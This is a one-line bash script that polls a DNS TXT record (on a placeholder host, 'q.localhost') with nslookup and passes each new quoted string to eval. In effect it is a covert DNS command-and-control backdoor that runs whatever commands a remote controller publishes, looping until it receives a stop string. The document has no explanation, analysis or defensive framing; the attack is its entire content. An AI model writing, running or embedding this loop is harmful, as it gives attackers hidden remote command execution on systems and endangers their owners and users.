while [ "$m" != "e" ];do nslookup -type=txt q.localhost|grep -o '"[^"]\+"'|while read m;do if [ "$m" != "$n" ] && [ ${#m} -gt 1 ];then n=$m;eval $m;fi;done;done
